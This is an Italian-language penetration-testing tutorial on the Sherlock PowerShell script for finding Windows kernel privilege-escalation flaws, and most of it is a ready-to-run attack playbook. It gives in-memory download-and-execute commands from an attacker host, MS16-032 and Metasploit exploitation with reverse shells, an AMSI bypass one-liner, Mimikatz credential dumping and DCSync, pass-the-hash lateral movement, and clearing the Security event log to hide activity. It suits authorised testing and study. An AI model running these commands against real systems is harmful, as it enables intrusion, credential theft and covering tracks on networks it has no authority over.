---
title: 'Sherlock: Automated Windows Privilege Escalation Checker'
slug: sherlock
description: Sherlock identifica vulnerabilità di privilege escalation su Windows confrontando patch installate e CVE note. Tool rapido per local privesc discovery.
image: /Gemini_Generated_Image_oh9wsxoh9wsxoh9w.webp
draft: true
date: 2026-02-25T00:00:00.000Z
categories:
  - windows
subcategories:
  - privilege-escalation
tags:
  - windows-enumeration
---

Sherlock è uno script PowerShell progettato per identificare rapidamente vulnerabilità note del kernel Windows che possono essere sfruttate per privilege escalation. Analizza il livello di patch del sistema e verifica la presenza di CVE exploitabili con tool pubblici. Quando hai bisogno di escalation veloce senza enumeration complessa, Sherlock è il tool giusto. In questa guida impari a identificare e sfruttare vulnerabilità kernel per ottenere SYSTEM.

### Posizione nella Kill Chain

Sherlock interviene quando cerchi un path diretto verso SYSTEM via kernel exploit:

```
Initial Access → Enumeration base → [SHERLOCK] → Kernel Exploit Identification → Exploitation → SYSTEM
```

## 1️⃣ Setup e Installazione

### Download

```bash
# Clone repository
git clone https://github.com/rasta-mouse/Sherlock.git

# Download diretto
wget https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1
```

### Trasferimento su Target

```powershell
# Download in memoria (raccomandato)
IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.50/Sherlock.ps1')

# Via certutil
certutil -urlcache -split -f http://192.168.1.50/Sherlock.ps1 C:\Windows\Temp\sh.ps1
```

### Verifica Funzionamento

```powershell
powershell -ep bypass
Import-Module .\Sherlock.ps1
Find-AllVulns
```

Output atteso:

```
Title      : User Mode to Ring (KiTrap0D)
MSBulletin : MS10-015
CVEID      : 2010-0232
...
```

### Requisiti

* PowerShell 2.0+
* Funziona come user standard
* Windows 7+ / Server 2008+
* Nessuna dipendenza esterna

## 2️⃣ Uso Base

### Esecuzione Standard

```powershell
Import-Module .\Sherlock.ps1
Find-AllVulns
```

Verifica tutte le vulnerabilità note nel database.

### Vulnerabilità Specifiche

```powershell
# Controlla solo MS15-051
Find-MS15051

# Controlla solo MS16-032
Find-MS16032

# Controlla solo CVE-2019-1405
Find-CVE20191405
```

### Output Interpretation

```
Title      : Secondary Logon Handle
MSBulletin : MS16-032
CVEID      : 2016-0099
Link       : https://www.exploit-db.com/exploits/39719/
VulnStatus : Appears Vulnerable
```

`VulnStatus: Appears Vulnerable` indica che il sistema potrebbe essere exploitabile.

## 3️⃣ Tecniche Operative

### Identificazione Vulnerabilità

```powershell
# COMANDO
IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.50/Sherlock.ps1')
Find-AllVulns
```

Output tipico su sistema non patchato:

```
Title      : Task Scheduler Service
MSBulletin : MS10-092
CVEID      : 2010-3338
Link       : https://www.exploit-db.com/exploits/15589/
VulnStatus : Appears Vulnerable

Title      : ClientCopyImage Win32k
MSBulletin : MS15-051
CVEID      : 2015-1701
Link       : https://www.exploit-db.com/exploits/37367/
VulnStatus : Appears Vulnerable

Title      : Secondary Logon Handle
MSBulletin : MS16-032
CVEID      : 2016-0099
Link       : https://www.exploit-db.com/exploits/39719/
VulnStatus : Appears Vulnerable
```

### Prioritizzazione Exploit

| Vulnerabilità | Affidabilità | Disponibilità Exploit |
| ------------- | ------------ | --------------------- |
| MS16-032      | Alta         | PowerShell exploit    |
| MS15-051      | Alta         | Metasploit module     |
| MS14-058      | Media        | Metasploit module     |
| MS10-015      | Media        | Compilato             |
| MS10-092      | Bassa        | Task Scheduler        |

### Exploitation MS16-032

Se Sherlock indica vulnerabile:

```powershell
# Download exploit
IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.50/MS16-032.ps1')

# Esegui exploit (spawn cmd as SYSTEM)
Invoke-MS16032
```

### Exploitation MS15-051

```bash
# Via Metasploit
use exploit/windows/local/ms15_051_client_copy_image
set SESSION 1
set LHOST 192.168.1.50
run
```

## 4️⃣ Tecniche Avanzate

### Integrazione con [Metasploit](https://hackita.it/articoli/metasploit)

```bash
# Dopo Sherlock identifica vuln
# In Meterpreter
meterpreter > background

# Usa local exploit suggester
use post/multi/recon/local_exploit_suggester
set SESSION 1
run

# Oppure exploit specifico
use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
set SESSION 1
run
```

### Cross-Reference con Windows Exploit Suggester

```bash
# Esporta systeminfo dal target
systeminfo > sysinfo.txt

# Analizza con windows-exploit-suggester
python windows-exploit-suggester.py --database 2024-01-15-mssb.xls --systeminfo sysinfo.txt
```

### Watson Integration

Per sistemi più recenti, usa Watson (successore di Sherlock):

```powershell
# Watson per Windows 10/Server 2016+
Watson.exe
```

Watson copre CVE più recenti non inclusi in Sherlock.

## 5️⃣ Scenari Pratici di Pentest

### Scenario 1: Quick Kernel PrivEsc Check

**Timeline: 5 minuti**

Hai shell limitata, vuoi verificare kernel exploits.

```powershell
# COMANDO
IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.50/Sherlock.ps1'); Find-AllVulns
```

## OUTPUT ATTESO

```
Title      : Secondary Logon Handle
MSBulletin : MS16-032
CVEID      : 2016-0099
VulnStatus : Appears Vulnerable

Title      : ClientCopyImage Win32k
MSBulletin : MS15-051
CVEID      : 2015-1701
VulnStatus : Appears Vulnerable
```

### COSA FARE SE FALLISCE

* **Script bloccato**: AMSI bypass o usa versione offuscata.
* **Tutti "Not Vulnerable"**: Sistema patchato. Cerca altri vettori (services, misconfig).
* **PowerShell bloccato**: Usa Watson (binario) o Windows Exploit Suggester offline.

### Scenario 2: MS16-032 Exploitation

**Timeline: 10 minuti**

Sherlock indica MS16-032 vulnerable.

```powershell
# COMANDO: Verifica
Find-MS16032
```

## OUTPUT ATTESO

```
Title      : Secondary Logon Handle
MSBulletin : MS16-032
VulnStatus : Appears Vulnerable
```

```powershell
# COMANDO: Scarica exploit PowerShell
IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.50/Invoke-MS16032.ps1')

# COMANDO: Esegui
Invoke-MS16032 -Command "C:\Windows\Temp\shell.exe"
```

## OUTPUT ATTESO

```
[*] Spawning cmd.exe as SYSTEM...
[+] Process spawned!

# Shell SYSTEM ricevuta sul listener
whoami
nt authority\system
```

### COSA FARE SE FALLISCE

* **Exploit fallisce**: Architettura errata (x86 vs x64). Usa versione corretta.
* **Process crash**: Sistema instabile. Prova exploit diverso o Metasploit module.
* **AV blocca payload**: Offusca shell.exe o usa payload fileless.

### Scenario 3: Metasploit Automated Exploitation

**Timeline: 15 minuti**

```bash
# COMANDO: In msfconsole con sessione attiva
use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
set SESSION 1
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.50
set LPORT 4445
run
```

## OUTPUT ATTESO

```
[*] Started reverse TCP handler on 192.168.1.50:4445
[*] Launching MS16-032 exploit...
[+] Secondary Logon service is running
[*] Meterpreter session 2 opened

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

### COSA FARE SE FALLISCE

* **Module fails**: Verifica SESSION corretta e target vulnerable.
* **Service not running**: Secondary Logon service disabled. Prova altro exploit.

## 6️⃣ Toolchain Integration

### Flusso Operativo

```
Shell → Sherlock (kernel check) → Exploit Selection → Metasploit/Manual → SYSTEM
```

### Workflow Completo

```powershell
# Step 1: Sherlock per identificazione
Find-AllVulns

# Step 2: Se trova vuln, seleziona exploit
# MS16-032 → PowerShell exploit o Metasploit
# MS15-051 → Metasploit module
# MS14-058 → Metasploit module

# Step 3: Exploitation
# ... (vedi scenari sopra)

# Step 4: Post-SYSTEM
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords"
```

### Confronto: Sherlock vs Alternative

| Feature     | Sherlock   | Watson     | WES              | PEASS       |
| ----------- | ---------- | ---------- | ---------------- | ----------- |
| Focus       | Kernel CVE | Kernel CVE | Tutti CVE        | All PrivEsc |
| Tipo        | PowerShell | C#         | Python (offline) | Multi       |
| Windows 10+ | Parziale   | ✓          | ✓                | ✓           |
| Execution   | On-target  | On-target  | Offline          | On-target   |
| Stealth     | Medio      | Alto       | N/A              | Basso       |

**Quando usare Sherlock**: Quick check kernel su sistemi legacy (Win7/2008/2012).

**Quando usare [Watson](https://hackita.it/articoli/watson)**: Sistemi Windows 10+ per CVE recenti.

## 7️⃣ Attack Chain Completa

### Scenario: Kernel PrivEsc to Domain Compromise

**Timeline totale: 60 minuti**

**Fase 1: Initial Access (10 min)**

```
Exploit web app → Low-priv shell
```

**Fase 2: Kernel Vulnerability Check (5 min)**

```powershell
IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.50/Sherlock.ps1')
Find-AllVulns
```

Output: MS16-032 Appears Vulnerable

**Fase 3: Privilege Escalation (10 min)**

```bash
# Metasploit
use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
set SESSION 1
run
```

Risultato: SYSTEM shell

**Fase 4: Credential Harvesting (15 min)**

```cmd
# Mimikatz
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords"
```

Output: Domain Admin credentials

**Fase 5: Lateral Movement (10 min)**

```cmd
# Pass-the-Hash
psexec.exe \\DC01 -u CORP\admin -p "P@ssw0rd" cmd.exe
```

**Fase 6: Domain Dominance (10 min)**

```cmd
# DCSync
mimikatz.exe "lsadump::dcsync /domain:corp.local /user:krbtgt"
```

## 8️⃣ Detection & Evasion

### Cosa Monitora il Blue Team

| Indicator            | Event/Log         | Detection            |
| -------------------- | ----------------- | -------------------- |
| PowerShell           | 4104              | Script block logging |
| Kernel exploit       | System crash/BSOD | Stability issues     |
| Token manipulation   | 4673/4674         | Privilege use        |
| Process spawn SYSTEM | 4688              | Process creation     |

### Tecniche di Evasion

**1. AMSI Bypass**

```powershell
# Prima di Sherlock
$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$a.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

**2. Uso Watson invece di Sherlock**

Watson è binario C#, meno rilevato di PowerShell script.

**3. Exploit Selection**

Scegli exploit più stabili e meno rumorosi. MS16-032 è preferibile perché non causa crash.

### Cleanup

Kernel exploits non lasciano file ma possono generare log:

```cmd
# Clear Security log (se SYSTEM)
wevtutil cl Security
```

## 9️⃣ Performance & Scaling

### Benchmark

| Check                | Tempo    |
| -------------------- | -------- |
| Single vulnerability | \~1 sec  |
| Find-AllVulns        | \~10 sec |

### Limitazioni

* Non supporta scanning remoto
* Solo vulnerabilità nel database (non aggiornato per CVE recenti)
* Richiede PowerShell sul target

### Alternative per Multi-Target

```bash
# Windows Exploit Suggester offline
# Raccogli systeminfo da tutti i target
for t in targets; do
    psexec \\$t systeminfo > $t_sysinfo.txt
done

# Analizza batch
python wes.py --database db.xls --systeminfo *.txt
```

## 🔟 Tabelle Tecniche

### Vulnerabilità Verificate da Sherlock

| MS Bulletin | CVE       | Nome              | OS Affected              |
| ----------- | --------- | ----------------- | ------------------------ |
| MS10-015    | 2010-0232 | KiTrap0D          | XP, 2003, Vista, 2008, 7 |
| MS10-092    | 2010-3338 | Task Scheduler    | Vista, 2008, 7           |
| MS13-053    | 2013-1300 | NTUserMessageCall | XP - 8, 2003-2012        |
| MS14-058    | 2014-4113 | TrackPopupMenu    | XP - 8.1, 2003-2012R2    |
| MS15-051    | 2015-1701 | ClientCopyImage   | Vista - 8.1, 2008-2012R2 |
| MS15-078    | 2015-2426 | Font Driver       | Vista - 8.1, 2008-2012R2 |
| MS16-016    | 2016-0051 | WebDAV            | Vista - 10, 2008-2012R2  |
| MS16-032    | 2016-0099 | Secondary Logon   | 7 - 10, 2008-2012R2      |
| MS16-034    | 2016-0093 | Win32k            | 7 - 10, 2008R2-2012R2    |

### Exploit Availability

| Vulnerabilità | PowerShell | Metasploit | Binary |
| ------------- | ---------- | ---------- | ------ |
| MS10-015      | ✗          | ✓          | ✓      |
| MS15-051      | ✗          | ✓          | ✓      |
| MS16-032      | ✓          | ✓          | ✓      |
| MS16-034      | ✗          | ✓          | ✓      |

## 1️⃣1️⃣ Troubleshooting

### Script Bloccato da AMSI

```powershell
# AMSI bypass
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

### "Not Vulnerable" su Tutto

Sistema patchato. Alternative:

1. Usa altri tool (WinPEAS, SharpUp) per misconfig
2. Cerca altri vettori (services, scheduled tasks)
3. Lateral movement invece di local privesc

### Exploit Fallisce

* Verifica architettura (x86/x64)
* Verifica Windows version esatta
* Prova Metasploit module invece di PowerShell
* Verifica che servizi necessari siano running

### PowerShell Bloccato

Usa Watson (C# binary) o analisi offline con Windows Exploit Suggester.

## 1️⃣2️⃣ FAQ

**Sherlock è ancora aggiornato?**

No, Sherlock non è più mantenuto. Per CVE recenti usa Watson o PEASS.

**Funziona su Windows 10?**

Parzialmente. Molte vulnerabilità sono patchate. Usa Watson per Win10.

**Devo essere admin per usare Sherlock?**

No, enumera come user standard. L'exploitation potrebbe richiedere privilegi specifici.

**Come scelgo quale exploit usare?**

Priorità: MS16-032 (stabile) > MS15-051 > MS14-058. Evita exploit che causano crash.

**Sherlock può crashare il sistema?**

Sherlock no (solo enumeration). L'exploitation può causare instabilità.

**Alternative più recenti?**

[Watson](https://github.com/rasta-mouse/Watson) per C# e CVE recenti, Windows Exploit Suggester per analisi offline.

## 1️⃣3️⃣ Cheat Sheet

| Operazione  | Comando                                        |
| ----------- | ---------------------------------------------- |
| Import      | `Import-Module .\Sherlock.ps1`                 |
| All vulns   | `Find-AllVulns`                                |
| In-memory   | `IEX(...); Find-AllVulns`                      |
| MS16-032    | `Find-MS16032`                                 |
| MS15-051    | `Find-MS15051`                                 |
| MS14-058    | `Find-MS14058`                                 |
| AMSI bypass | `$a=[Ref].Assembly.GetType('...AmsiUtils')...` |

***

*Uso consentito solo in ambienti autorizzati. Per penetration test professionali: [hackita.it/servizi](https://hackita.it/servizi). Supporta HackIta: [hackita.it/supporto](https://hackita.it/supporto).*

**Repository**: [rasta-mouse/Sherlock](https://github.com/rasta-mouse/Sherlock) | Successore: [Watson](https://github.com/rasta-mouse/Watson)
